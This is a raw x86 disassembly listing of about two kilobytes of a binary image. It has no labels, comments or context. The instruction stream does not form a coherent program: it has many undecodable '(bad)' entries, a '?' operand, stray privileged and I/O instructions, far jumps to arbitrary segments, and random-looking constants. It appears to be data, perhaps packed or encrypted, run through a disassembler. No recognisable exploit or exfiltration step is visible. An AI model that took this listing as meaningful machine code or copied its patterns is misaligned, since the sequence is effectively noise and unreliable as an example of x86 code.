  40e7cc:	mov    ds:0x5a5834a2,al
  40e7d1:	call   FWORD PTR [ebp+ecx*4-0x69a96802]
  40e7d8:	mov    esi,0x5068adfa
  40e7dd:	mov    eax,0x62840e85
  40e7e2:	jmp    0x40e835
  40e7e4:	xor    DWORD PTR cs:[edx+0x5af38c18],esp
  40e7eb:	(bad)  
  40e7ed:	inc    edi
  40e7ee:	dec    ebp
  40e7ef:	jge    0x40e7ed
  40e7f1:	hlt    
  40e7f2:	mul    BYTE PTR [edi]
  40e7f4:	aam    0x70
  40e7f6:	jnp    0x40e84d
  40e7f8:	(bad)  
  40e7f9:	cmp    al,0xee
  40e7fb:	daa    
  40e7fc:	call   0x7421:0x971788f3
  40e803:	push   ds
  40e804:	sub    edx,ebx
  40e806:	les    ebx,FWORD PTR [eax]
  40e808:	ss es mov dh,0xe4
  40e80c:	into   
  40e80d:	cmp    al,0xa2
  40e80f:	es mov dh,0x4f
  40e812:	in     eax,0xa6
  40e814:	or     al,0x3
  40e816:	shr    DWORD PTR [ebp-0x18],0xe4
  40e81a:	add    eax,0xee8a9170
  40e81f:	ds (bad) 
  40e821:	in     al,dx
  40e822:	mov    al,ds:0x584e2024
  40e827:	or     BYTE PTR [eax+esi*2-0x6d6c16e3],bh
  40e82e:	mov    ah,0xc3
  40e830:	out    0xc1,eax
  40e832:	and    BYTE PTR [esi],al
  40e834:	shr    DWORD PTR [edx-0x228ed0fd],cl
  40e83a:	dec    edx
  40e83b:	push   ds
  40e83c:	adc    DWORD PTR [ecx],ebp
  40e83e:	push   0xffffffc2
  40e840:	dec    edi
  40e841:	mov    ecx,DWORD PTR [edi-0x6]
  40e844:	mov    eax,ds:0xabeec5d2
  40e849:	arpl   di,si
  40e84b:	xor    esi,DWORD PTR [ebx+0xe]
  40e84e:	fwait
  40e84f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e850:	sub    ebx,esi
  40e852:	jae    0x40e864
  40e854:	cli    
  40e855:	sub    BYTE PTR [ebp+0x1d5cc155],0x14
  40e85c:	mov    ch,dh
  40e85e:	sub    eax,0xf055812e
  40e863:	js     0x40e8d3
  40e865:	and    BYTE PTR [esi],bl
  40e867:	cmp    ebx,DWORD PTR [ecx-0x59]
  40e86a:	ret    0x7a02
  40e86d:	lahf   
  40e86e:	icebp  
  40e86f:	sub    ebx,esi
  40e871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e872:	stc    
  40e873:	lods   al,BYTE PTR ds:[esi]
  40e874:	out    0xa4,al
  40e876:	test   eax,0x6c37c948
  40e87b:	push   edi
  40e87c:	stc    
  40e87d:	or     eax,0x400a5dc4
  40e882:	push   esp
  40e883:	lods   al,BYTE PTR ds:[esi]
  40e884:	scas   al,BYTE PTR es:[edi]
  40e885:	das    
  40e886:	adc    eax,0xdff75d20
  40e88b:	xchg   DWORD PTR [edi],ecx
  40e88d:	xchg   DWORD PTR [ebx-0x154e78f9],ebp
  40e893:	cwde   
  40e894:	imul   ebp,DWORD PTR [edx+0x38c4a264],0x38b29a34
  40e89e:	gs push cs
  40e8a0:	inc    eax
  40e8a1:	cdq    
  40e8a2:	(bad)  [edi]
  40e8a4:	sahf   
  40e8a5:	dec    ecx
  40e8a6:	stc    
  40e8a7:	xchg   ecx,eax
  40e8a8:	xor    eax,0x36697b3b
  40e8ad:	ret    
  40e8ae:	outs   dx,BYTE PTR ds:[esi]
  40e8af:	(bad)  
  40e8b0:	sbb    eax,0xa1e228c7
  40e8b5:	pushf  
  40e8b6:	pusha  
  40e8b7:	mov    ebx,0x4b1f1cee
  40e8bc:	hlt    
  40e8bd:	sub    al,0x91
  40e8bf:	or     DWORD PTR [esi-0x7d],edi
  40e8c2:	jg     0x40e938
  40e8c4:	cwde   
  40e8c5:	lds    esp,FWORD PTR [eax]
  40e8c7:	(bad)  
  40e8c9:	int    0xcc
  40e8cb:	xchg   ebx,eax
  40e8cc:	or     esp,edx
  40e8ce:	jmp    0xc90e:0xb6d9ca84
  40e8d5:	in     eax,dx
  40e8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d7:	and    ebx,DWORD PTR [ecx+0x1dc5e7c0]
  40e8dd:	outs   dx,BYTE PTR ds:[esi]
  40e8de:	iret   
  40e8df:	lods   al,BYTE PTR ds:[esi]
  40e8e0:	adc    cl,BYTE PTR [esi-0x6f]
  40e8e3:	bound  ecx,QWORD PTR [esi+0x36]
  40e8e6:	mov    ebp,0xfa7ac327
  40e8eb:	sti    
  40e8ec:	mov    eax,0xc63963ab
  40e8f1:	aaa    
  40e8f2:	cs add al,0x74
  40e8f5:	cld    
  40e8f6:	xchg   ecx,eax
  40e8f7:	jnp    0x40e8fd
  40e8f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8fa:	or     al,BYTE PTR [ecx+0x2f4457a2]
  40e900:	push   ebx
  40e901:	dec    eax
  40e902:	jmp    0x40e8ce
  40e904:	sbb    ecx,DWORD PTR [edi-0x62]
  40e907:	sub    esp,DWORD PTR [esi+0x4a]
  40e90a:	stos   DWORD PTR es:[edi],eax
  40e90b:	sbb    DWORD PTR [ecx],0xda044da9
  40e911:	push   ss
  40e912:	mov    al,ds:0x47a2dff3
  40e917:	pusha  
  40e918:	cs int3 
  40e91a:	stc    
  40e91b:	push   ds
  40e91c:	mov    esi,ss
  40e91e:	xchg   DWORD PTR [edi+eiz*1],ecx
  40e921:	and    ch,BYTE PTR [eax]
  40e923:	xor    ch,BYTE PTR [ecx]
  40e925:	popf   
  40e926:	jns    0x40e985
  40e928:	pop    es
  40e929:	daa    
  40e92a:	inc    edi
  40e92b:	idiv   BYTE PTR [ebx+0x3f10519]
  40e931:	xchg   BYTE PTR [ecx-0x78c17cc5],dh
  40e937:	mov    ebp,0xc7975feb
  40e93c:	loop   0x40e9a2
  40e93e:	jmp    0x2a2a:0xc6c9935c
  40e945:	adc    al,0x28
  40e947:	mov    al,0xd7
  40e949:	sub    BYTE PTR [ecx+0x2ddea187],0xad
  40e950:	push   ss
  40e951:	add    BYTE PTR [ebx+0x68],al
  40e954:	add    BYTE PTR [ebx+edi*8+0x5b],dh
  40e958:	or     eax,0xc044fada
  40e95d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e95e:	mov    ecx,0x1abd9e9f
  40e963:	adc    dh,BYTE PTR [esi-0xf]
  40e966:	retf   0x50d4
  40e969:	repnz addr16 out 0x16,eax
  40e96d:	and    BYTE PTR [edx],0x5
  40e970:	mov    eax,0x18bb0f07
  40e975:	mov    esi,0x3cb3132a
  40e97a:	daa    
  40e97b:	in     al,dx
  40e97c:	xchg   BYTE PTR [ebx],dl
  40e97e:	jg     0x40e99b
  40e980:	xchg   BYTE PTR [ecx+0x67ca9d7d],ah
  40e986:	std    
  40e987:	fs mov dl,0xc3
  40e98a:	adc    al,0x17
  40e98c:	push   cs
  40e98d:	cwde   
  40e98e:	aad    0x1f
  40e990:	mov    al,ds:0x68507b48
  40e995:	(bad)  
  40e997:	pop    eax
  40e998:	in     eax,dx
  40e999:	clc    
  40e99a:	ficom  DWORD PTR [ebx-0x4a]
  40e99d:	xor    eax,0xa0ba3e51
  40e9a2:	sub    DWORD PTR [eax+0x7c5fc902],ebx
  40e9a8:	xchg   esp,eax
  40e9a9:	xor    DWORD PTR [ecx-0x24],edi
  40e9ac:	xchg   ebx,eax
  40e9ad:	sbb    BYTE PTR [ebp-0x77b7df6b],0x59
  40e9b4:	mov    ebp,DWORD PTR [ebx+0x2]
  40e9b7:	mov    DWORD PTR [ebx],0xf27694b7
  40e9bd:	jbe    0x40ea28
  40e9bf:	jp     0x40ea33
  40e9c1:	cli    
  40e9c2:	xor    bh,BYTE PTR [edx-0x76]
  40e9c5:	sub    cl,BYTE PTR [esi+eiz*1-0x7bcb3c3f]
  40e9cc:	adc    DWORD PTR [esi],ebx
  40e9ce:	xchg   ecx,eax
  40e9cf:	loop   0x40ea11
  40e9d1:	retf   0x5c4d
  40e9d4:	add    al,0xbc
  40e9d6:	sub    esi,edx
  40e9d8:	dec    ebx
  40e9d9:	jl     0x40ea4f
  40e9db:	sub    ecx,0xffffffcb
  40e9de:	pop    ss
  40e9df:	ret    0x21ac
  40e9e2:	mov    al,0x9c
  40e9e4:	movzx  eax,BYTE PTR [eax-0x61]
  40e9e8:	inc    eax
  40e9e9:	sti    
  40e9ea:	bound  edi,QWORD PTR [ebx-0x6fcce277]
  40e9f0:	mov    ds:0x30a0e3a,eax
  40e9f5:	cmp    BYTE PTR [eax],0x75
  40e9f8:	push   ecx
  40e9f9:	retf   
  40e9fa:	xchg   ecx,eax
  40e9fb:	jo     0x40ea0b
  40e9fd:	dec    ebp
  40e9fe:	sub    ebx,DWORD PTR [eax-0xc3d6e1]
  40ea04:	pushf  
  40ea05:	pop    ebp
  40ea06:	mov    es,WORD PTR [edi]
  40ea08:	pop    ecx
  40ea09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea0a:	mov    esi,0x35068e5f
  40ea0f:	jmp    0x2b31:0x3816752c
  40ea16:	lock pop eax
  40ea18:	(bad)  
  40ea19:	ins    DWORD PTR es:[edi],dx
  40ea1a:	mov    ebx,0xf01205e4
  40ea1f:	sub    al,0xb6
  40ea21:	in     eax,0x3f
  40ea23:	and    eax,0x6965caef
  40ea28:	test   DWORD PTR [ecx-0x29],esp
  40ea2b:	pop    esp
  40ea2c:	pop    esp
  40ea2d:	bound  esi,QWORD PTR [ecx+0x14]
  40ea30:	(bad)  
  40ea31:	xor    al,0x18
  40ea33:	inc    edi
  40ea34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea36:	fst    st(4)
  40ea38:	lds    ecx,FWORD PTR [esi+0x74]
  40ea3b:	mov    ah,0x21
  40ea3d:	sbb    al,0x15
  40ea3f:	or     DWORD PTR [eax-0x5a],esp
  40ea42:	out    0x7e,eax
  40ea44:	xor    eax,0x6938673c
  40ea49:	mov    esi,0x28dc85ea
  40ea4e:	ds xor eax,0x3f6f4dbf
  40ea54:	jp     0x40ea88
  40ea56:	mov    cl,bl
  40ea58:	mov    ch,0x5c
  40ea5a:	sub    eax,0xbe0617e7
  40ea5f:	push   eax
  40ea60:	mov    edi,0x23bfdf11
  40ea65:	xlat   BYTE PTR ds:[ebx]
  40ea66:	sbb    edi,DWORD PTR [edi]
  40ea68:	test   DWORD PTR [edi],edi
  40ea6a:	clc    
  40ea6b:	push   ebp
  40ea6c:	pop    ecx
  40ea6d:	pop    es
  40ea6e:	out    dx,eax
  40ea6f:	ror    DWORD PTR [esi-0x7acab9a1],cl
  40ea75:	jecxz  0x40ea1a
  40ea77:	or     DWORD PTR [ebx-0xf],0xffffff9c
  40ea7b:	mov    al,0x86
  40ea7d:	pop    ebx
  40ea7e:	data16 xchg BYTE PTR [eax+0x5ba36bc7],cl
  40ea85:	mov    esi,0xb067780c
  40ea8a:	or     al,0xdd
  40ea8c:	pop    ebp
  40ea8d:	iret   
  40ea8e:	test   al,0x76
  40ea91:	inc    esp
  40ea92:	pop    ds
  40ea93:	jl     0x40eaa6
  40ea95:	sub    dh,al
  40ea97:	out    0x50,al
  40ea99:	and    ebx,DWORD PTR [ecx-0x65]
  40ea9c:	pop    edi
  40ea9d:	add    BYTE PTR [ebx+0x2be14fe0],dl
  40eaa3:	xchg   ebp,eax
  40eaa4:	in     eax,dx
  40eaa5:	pop    ss
  40eaa6:	scas   al,BYTE PTR es:[edi]
  40eaa7:	and    al,0xbe
  40eaa9:	stc    
  40eaaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaab:	outs   dx,DWORD PTR ds:[esi]
  40eaac:	lea    esi,[edi+0x4e429e3b]
  40eab2:	push   0x5df7c7a4
  40eab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eab8:	xchg   ecx,eax
  40eab9:	xor    ecx,ebp
  40eabb:	mov    ebp,0x4fde3710
  40eac0:	(bad)  
  40eac1:	jmp    0x40eb20
  40eac3:	sbb    ah,dl
  40eac5:	jg     0x40eadc
  40eac7:	fisttp WORD PTR [edi]
  40eac9:	push   0x1c72dd1b
  40eace:	lock adc BYTE PTR [ecx-0x195faebe],dh
  40ead5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ead6:	retf   0x265a
  40ead9:	xor    bh,BYTE PTR [edx-0x3eb5bef6]
  40eadf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae0:	(bad)  
  40eae1:	outs   dx,DWORD PTR ds:[esi]
  40eae2:	mov    ebx,0xd0e39453
  40eae7:	das    
  40eae8:	inc    ebp
  40eae9:	inc    ebx
  40eaea:	mov    dl,0x9e
  40eaec:	or     ecx,DWORD PTR [esi-0x28]
  40eaef:	xchg   esp,eax
  40eaf0:	ret    0x2b6
  40eaf3:	and    BYTE PTR [ebx+edx*4-0x80],dl
  40eaf7:	xchg   DWORD PTR [eax+ecx*8+0x216965a1],esp
  40eafe:	jo     0x40eb68
  40eb00:	xchg   esp,eax
  40eb01:	iret   
  40eb02:	jp     0x40eab2
  40eb04:	icebp  
  40eb05:	xor    BYTE PTR [ecx+0x5d93789b],0xbe
  40eb0c:	lods   al,BYTE PTR ds:[esi]
  40eb0d:	rcl    DWORD PTR [ecx+eax*4+0x65],1
  40eb11:	(bad)  [edx-0x7b557252]
  40eb17:	sub    eax,0x578f69bc
  40eb1c:	mov    bl,0x3d
  40eb1e:	jne    0x40eb1b
  40eb20:	jmp    0x40eaaf
  40eb22:	and    al,0xa2
  40eb24:	jge    0x40eadd
  40eb26:	imul   ebp,edi,0x4e
  40eb29:	rcl    cl,cl
  40eb2b:	or     al,0x7a
  40eb2d:	pop    eax
  40eb2e:	out    0xb4,eax
  40eb30:	cmp    al,0x89
  40eb32:	shl    edx,cl
  40eb34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb35:	or     al,0x55
  40eb37:	fstp   TBYTE PTR [eax]
  40eb39:	out    dx,al
  40eb3a:	sbb    BYTE PTR [ecx],ch
  40eb3c:	add    DWORD PTR [ebx],esp
  40eb3e:	outs   dx,BYTE PTR ds:[esi]
  40eb3f:	sahf   
  40eb40:	sbb    DWORD PTR [eax+eax*2],ebx
  40eb43:	inc    ebp
  40eb44:	pop    edi
  40eb45:	mov    ds:0x38152bef,al
  40eb4a:	fstp   QWORD PTR [ecx]
  40eb4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb4d:	xchg   DWORD PTR [edx],edi
  40eb4f:	pushf  
  40eb50:	test   eax,0x7312fa66
  40eb55:	pushf  
  40eb56:	lock or eax,0xd306a0d4
  40eb5c:	sahf   
  40eb5d:	add    dh,BYTE PTR [ecx+edx*8-0x8]
  40eb61:	jnp    0x40ebad
  40eb63:	loop   0x40eb18
  40eb65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb66:	pop    ecx
  40eb67:	jp     0x40ebc5
  40eb69:	mov    bl,0xf1
  40eb6b:	inc    ebp
  40eb6c:	add    bl,BYTE PTR [ecx]
  40eb6e:	fsubr  DWORD PTR [ecx+0x5cd2a09c]
  40eb74:	(bad)  
  40eb75:	pop    esi
  40eb76:	mov    eax,0xdbfb051b
  40eb7b:	call   0xd86d7e2b
  40eb80:	ja     0x40eb9b
  40eb82:	and    eax,0x9bb3b660
  40eb87:	cmc    
  40eb88:	xor    DWORD PTR [ecx-0x3c1868ae],eax
  40eb8e:	mov    ds:0xf0c811df,al
  40eb93:	push   0x9bd62a15
  40eb98:	xchg   ebp,eax
  40eb99:	jb     0x40eb69
  40eb9b:	and    cl,0x50
  40eb9e:	pop    es
  40eb9f:	lods   al,BYTE PTR ds:[esi]
  40eba0:	inc    edi
  40eba1:	jne    0x40eb29
  40eba3:	sub    eax,DWORD PTR ds:0x19b2a7af
  40eba9:	aas    
  40ebaa:	or     al,0xb5
  40ebac:	sub    eax,0x3d99a1e0
  40ebb1:	or     al,0x31
  40ebb3:	(bad)  
  40ebb4:	outs   dx,DWORD PTR ds:[esi]
  40ebb5:	in     al,0xcf
  40ebb7:	mov    dh,0xa3
  40ebb9:	std    
  40ebba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebbb:	pop    ecx
  40ebbc:	dec    cl
  40ebbe:	jmp    0x5305b8a9
  40ebc3:	pop    eax
  40ebc4:	nop
  40ebc5:	icebp  
  40ebc6:	std    
  40ebc7:	or     ebx,eax
  40ebc9:	bound  ebx,QWORD PTR [edi]
  40ebcb:	xlat   BYTE PTR ds:[ebx]
  40ebcc:	stc    
  40ebcd:	or     BYTE PTR [edx+0x4cbcf8e4],bl
  40ebd3:	xchg   ebp,eax
  40ebd4:	nop
  40ebd5:	push   0xffffffaf
  40ebd7:	xlat   BYTE PTR ds:[ebx]
  40ebd8:	push   ds
  40ebd9:	enter  0xf84,0x96
  40ebdd:	pop    ecx
  40ebde:	mov    esi,DWORD PTR [edx+0x2d]
  40ebe1:	pop    edi
  40ebe2:	dec    edx
  40ebe3:	sbb    edx,DWORD PTR cs:[ecx+esi*4+0x65]
  40ebe8:	inc    ebp
  40ebe9:	rcl    DWORD PTR [ecx-0x75],0xae
  40ebed:	into   
  40ebee:	xchg   ebx,eax
  40ebef:	pop    ebx
  40ebf0:	jb     0x40ec02
  40ebf2:	mov    ecx,0xaa0d1984
  40ebf7:	inc    ecx
  40ebf8:	in     al,dx
  40ebf9:	loope  0x40ec53
  40ebfb:	sbb    edi,DWORD PTR ds:[edx-0x5be2ab75]
  40ec02:	jecxz  0x40ec66
  40ec04:	(bad)  
  40ec05:	retf   
  40ec06:	lea    eax,[edi]
  40ec08:	lahf   
  40ec09:	jg     0x40ec21
  40ec0b:	jge    0x40ec45
  40ec0d:	lods   eax,DWORD PTR ds:[esi]
  40ec0e:	icebp  
  40ec0f:	aad    0x4c
  40ec11:	(bad)  
  40ec12:	mov    eax,0x10002f14
  40ec17:	out    0x8d,eax
  40ec19:	sbb    al,0xbe
  40ec1b:	in     al,dx
  40ec1c:	popa   
  40ec1d:	(bad)  
  40ec1e:	pusha  
  40ec1f:	iret   
  40ec20:	neg    ebp
  40ec22:	xor    bl,BYTE PTR [edx]
  40ec24:	jmp    0x40ec62
  40ec26:	dec    ebp
  40ec27:	xlat   BYTE PTR ds:[ebx]
  40ec28:	fidiv  WORD PTR [edx+0x7421fef1]
  40ec2e:	cwde   
  40ec2f:	jmp    0x6b2b8f3d
  40ec34:	jge    0x40ec1a
  40ec36:	(bad)  
  40ec37:	pop    ds
  40ec38:	stc    
  40ec39:	call   0x71522a1c
  40ec3e:	add    al,0xbe
  40ec40:	iret   
  40ec41:	ficomp WORD PTR [ebp-0x105fd54f]
  40ec47:	fwait
  40ec48:	lock mov al,0xde
  40ec4b:	mov    WORD PTR [edi+0x3f],?
  40ec4e:	test   esp,ecx
  40ec50:	push   0x48
  40ec52:	(bad)  
  40ec53:	cmc    
  40ec54:	jbe    0x40ecc6
  40ec56:	or     eax,0xca01ea87
  40ec5b:	xchg   ebp,eax
  40ec5c:	outs   dx,BYTE PTR ds:[esi]
  40ec5d:	push   ebp
  40ec5e:	jge    0x40ec95
  40ec60:	out    0xc1,al
  40ec62:	ins    BYTE PTR es:[edi],dx
  40ec63:	call   0xeb8c6142
  40ec68:	retf   0x70c0
  40ec6b:	cmp    DWORD PTR [esi-0x67],esi
  40ec6e:	and    al,0xa2
  40ec70:	mov    esp,edx
  40ec72:	xchg   edi,eax
  40ec73:	fwait
  40ec74:	jge    0x40ec82
  40ec76:	test   DWORD PTR [esi],0xf08bbed2
  40ec7c:	lds    esi,FWORD PTR [esp+ebx*2]
  40ec7f:	push   esi
  40ec80:	sbb    al,0x55
  40ec82:	sbb    al,0xc0
  40ec84:	jo     0x40ec50
  40ec86:	mov    al,0xaf
  40ec88:	or     BYTE PTR [eax+0x70f0942d],cl
  40ec8e:	test   al,0x78
  40ec90:	loopne 0x40ece2
  40ec92:	jae    0x40ec53
  40ec94:	add    esi,edx
  40ec96:	arpl   WORD PTR [eax],ax
	...
  40ed14:	xchg   edx,eax
  40ed15:	inc    esp
  40ed16:	scas   al,BYTE PTR es:[edi]
  40ed17:	jecxz  0x40ed17
  40ed19:	jmp    0x40ecfa
  40ed1b:	jne    0x40ed80
  40ed1d:	pop    ecx
  40ed1e:	jmp    0x16a9:0xc059701d
  40ed25:	call   0x0:0x76b0000
  40ed2c:	fsubr  st(4),st
  40ed2e:	ret    
  40ed2f:	shrd   DWORD PTR [edi+edi*8+0x6d984420],ebx,0x9f
  40ed38:	and    ebp,DWORD PTR [edi+0x72b17e89]
  40ed3e:	adc    esp,DWORD PTR [eax-0x6854ebfc]
  40ed44:	cwde   
  40ed45:	adc    eax,0x744d9e3
  40ed4a:	rcl    BYTE PTR [eax],cl
  40ed4c:	lds    esp,FWORD PTR [eax-0xb]
  40ed4f:	pop    ebx
  40ed50:	fisttp DWORD PTR [edx]
  40ed52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed53:	idiv   DWORD PTR [eax+0xd]
  40ed56:	mov    ds:0xac1e7655,eax
  40ed5b:	mov    BYTE PTR [esp+ecx*1],bl
  40ed5e:	or     eax,0xf47871c
  40ed63:	cmp    DWORD PTR [edx-0x6b],0x17
  40ed67:	scas   eax,DWORD PTR es:[edi]
  40ed68:	pop    ebx
  40ed69:	jle    0x40ed99
  40ed6b:	jbe    0x40ed32
  40ed6d:	outs   dx,DWORD PTR ds:[esi]
  40ed6e:	imul   edx,eax,0xffffffc5
  40ed71:	es jno 0x40ed40
  40ed74:	and    esi,DWORD PTR [ebx+0x77725b2b]
  40ed7a:	cmp    DWORD PTR [eax],ebx
  40ed7c:	or     esi,DWORD PTR [edi-0x7c1f036d]
  40ed82:	mov    ds:0x530dd083,al
  40ed87:	dec    edi
  40ed88:	jo     0x40ed7b
  40ed8a:	out    dx,eax
  40ed8b:	ins    BYTE PTR es:[edi],dx
  40ed8c:	dec    edx
  40ed8d:	pop    es
  40ed8e:	addr16 dec edx
  40ed90:	jmp    0x40ed2a
  40ed92:	sbb    al,0xd0
  40ed94:	outs   dx,BYTE PTR ds:[esi]
  40ed95:	sub    ch,BYTE PTR [esp+edi*4-0x7db05a82]
  40ed9c:	sbb    ah,BYTE PTR [ebx-0x7a]
  40ed9f:	ror    BYTE PTR [ebp+0x58],0xb3
  40eda3:	mov    al,ds:0xa6f4dffd
  40eda8:	repz (bad) 
  40edaa:	and    cl,dl
  40edac:	shl    DWORD PTR [esi-0x36],1
  40edaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edb0:	lods   eax,DWORD PTR ds:[esi]
  40edb1:	bound  edx,QWORD PTR [ebx]
  40edb3:	mov    eax,0xe73d9e56
  40edb8:	hlt    
  40edb9:	in     eax,dx
  40edba:	xchg   dl,bl
  40edbc:	idiv   BYTE PTR [eax+0x278e1cec]
  40edc2:	into   
  40edc3:	ror    BYTE PTR [ecx],1
  40edc5:	sub    DWORD PTR [ebx+0x1c],edi
  40edc8:	pop    ecx
  40edc9:	push   0x77b07177
  40edce:	icebp  
  40edcf:	xchg   BYTE PTR [edi],cl
  40edd1:	xchg   eax,ebx
  40edd3:	pop    ss
  40edd4:	popf   
  40edd5:	fist   WORD PTR [esp+ecx*1-0x52b07cc2]
  40eddc:	and    BYTE PTR [ebp+ecx*4-0x32a441b8],dh
  40ede3:	jmp    0x619ecf28
  40ede8:	out    0xd9,al
  40edea:	ror    cl,0x8f
  40eded:	xchg   esp,eax
  40edee:	retf   0xa703
  40edf1:	stos   BYTE PTR es:[edi],al
  40edf2:	pop    es
  40edf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf4:	jo     0x40ede6
  40edf6:	scas   al,BYTE PTR es:[edi]
  40edf7:	mov    esp,0x2ba8d1
  40edfc:	pop    esi
  40edfd:	sbb    al,0xa2
  40edff:	ffree  st(4)
  40ee01:	js     0x40edbf
  40ee03:	jl     0x40ee25
  40ee05:	in     al,0x30
  40ee07:	sbb    eax,0x29f7725b
  40ee0c:	stos   DWORD PTR es:[edi],eax
  40ee0d:	rcl    DWORD PTR [edx+0x3471e25a],1
  40ee13:	out    dx,al
  40ee14:	retf   
  40ee15:	in     eax,dx
  40ee16:	xchg   ecx,eax
  40ee17:	push   ds
  40ee18:	dec    esi
  40ee19:	pop    es
  40ee1a:	mov    bh,0x32
  40ee1c:	mov    BYTE PTR [esi+0x46],ah
  40ee1f:	bound  eax,QWORD PTR [ebp-0x1edd9d17]
  40ee25:	jge    0x40ee55
  40ee27:	mov    edi,0x7b79b7b2
  40ee2c:	xchg   ecx,eax
  40ee2d:	xchg   ebx,eax
  40ee2e:	mov    edx,ecx
  40ee30:	aaa    
  40ee31:	inc    eax
  40ee32:	cmp    edi,edx
  40ee34:	mov    eax,0x3cdcdb98
  40ee39:	idiv   BYTE PTR [esi-0x71fdb9ee]
  40ee3f:	cmp    DWORD PTR [edi+0x221831c0],ebx
  40ee45:	icebp  
  40ee46:	mov    ebx,0x46a61cf9
  40ee4b:	adc    DWORD PTR [edi-0x2b],ebx
  40ee4e:	xsaveopt [bx]
  40ee52:	shl    edi,0xa0
  40ee55:	das    
  40ee56:	add    DWORD PTR [edx-0x7f],ebx
  40ee59:	mov    bl,0xf5
  40ee5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee5c:	clc    
  40ee5d:	sub    eax,0x68b1e22
  40ee62:	mov    dh,0x22
  40ee64:	cmp    dh,cl
  40ee66:	mov    cl,0x56
  40ee68:	adc    BYTE PTR [esp+edi*4],dh
  40ee6b:	and    esi,esi
  40ee6d:	push   ss
  40ee6e:	dec    esp
  40ee6f:	push   ebx
  40ee70:	pop    esi
  40ee71:	lods   eax,DWORD PTR ds:[esi]
  40ee72:	fwait
  40ee73:	inc    ecx
  40ee74:	das    
  40ee75:	push   edx
  40ee76:	xchg   ebx,eax
  40ee77:	pop    ebp
  40ee78:	sub    eax,0xe9f7e451
  40ee7d:	mov    dh,0xeb
  40ee7f:	arpl   WORD PTR [esi+0x472da17f],cx
  40ee85:	sub    eax,0xdb4de438
  40ee8a:	jo     0x40ee81
  40ee8c:	add    eax,DWORD PTR [ebp+0x18d7c171]
  40ee92:	or     al,BYTE PTR [edx+0x2e]
  40ee95:	je     0x40ef11
  40ee97:	dec    esp
  40ee98:	xor    DWORD PTR [ecx+0x51390db2],0x1d
  40ee9f:	mov    dl,0x2b
  40eea1:	test   al,0x0
  40eea3:	mov    ebx,0x4f28bb36
  40eea8:	repz jo 0x40eef1
  40eeab:	in     al,dx
  40eeac:	sub    eax,0x23b4cf83
  40eeb1:	fst    st(0)
  40eeb3:	add    esi,edx
  40eeb5:	cmc    
  40eeb6:	fldenv [ecx-0x64]
  40eeb9:	jns    0x40eed0
  40eebb:	mov    eax,0x95859bc6
  40eec0:	xchg   edi,eax
  40eec1:	fsub   QWORD PTR [edi+0xe]
  40eec4:	jno    0x40eea0
  40eec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eec7:	push   DWORD PTR ds:0x8af9603
  40eecd:	mov    bl,0x5f
  40eecf:	clc    
  40eed0:	fsubr  QWORD PTR [edi-0x49]
  40eed3:	mov    BYTE PTR [esi-0x398d246e],ah
  40eed9:	pop    ecx
  40eeda:	cmc    
  40eedb:	hlt    
  40eedc:	fsub   QWORD PTR [ecx]
  40eede:	sbb    eax,0x6317e326
  40eee3:	inc    esp
  40eee4:	or     BYTE PTR [edx-0x4d0fef5c],0x7a
  40eeeb:	and    DWORD PTR [edx],0xffffff8d
  40eeee:	jmp    0x40eefe
  40eef0:	rcl    DWORD PTR [ecx],1
  40eef2:	adc    eax,0xc2d64ac6
  40eef7:	push   cs
  40eef8:	cmp    edi,DWORD PTR [ebp+0x35922f2b]
  40eefe:	ja     0x40ef61
  40ef00:	push   cs
  40ef01:	or     DWORD PTR [edi],0xffffff80
  40ef04:	out    0xde,eax
  40ef06:	add    eax,0x9301e33c
  40ef0b:	int3   
  40ef0c:	in     al,dx
  40ef0d:	xor    edx,DWORD PTR [edx-0x7c]
  40ef10:	push   ebp
  40ef11:	dec    esi
  40ef12:	dec    edi
  40ef13:	adc    edi,ebp
  40ef15:	repz adc dh,bl
  40ef18:	xchg   ebx,eax
  40ef19:	mov    eax,ds:0xb2fce1a8
  40ef1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef1f:	cmp    al,0x6f
  40ef21:	mov    al,ds:0xa5086543
  40ef26:	arpl   bp,cx
  40ef28:	bound  ebx,QWORD PTR [edi]
  40ef2a:	mov    DWORD PTR [eax+0x5b],ecx
  40ef2d:	sahf   
  40ef2e:	jle    0x40ef9a
  40ef30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef31:	test   eax,0x4470611e
  40ef36:	add    dh,BYTE PTR [ecx+0x4858106]
  40ef3c:	mov    eax,0x7fcc07c6
  40ef41:	test   DWORD PTR [edx+0x2],esi
  40ef44:	mov    esi,0xaa0569b0
  40ef49:	inc    ecx
  40ef4a:	iret   
  40ef4b:	jmp    0xf7179244
  40ef50:	(bad)  
  40ef51:	test   al,0x8d
  40ef53:	ins    DWORD PTR es:[edi],dx
  40ef54:	hlt    
  40ef55:	sar    eax,1
  40ef57:	sub    eax,0x4910d3cd
  40ef5c:	imul   esp,DWORD PTR [eax],0xf3e32597
  40ef62:	mov    ah,0x83
  40ef64:	jb     0x40ef7f
  40ef66:	dec    ebp
  40ef67:	jmp    0xd4923fd4
  40ef6c:	ds or  al,0xe
  40ef6f:	stos   DWORD PTR es:[edi],eax
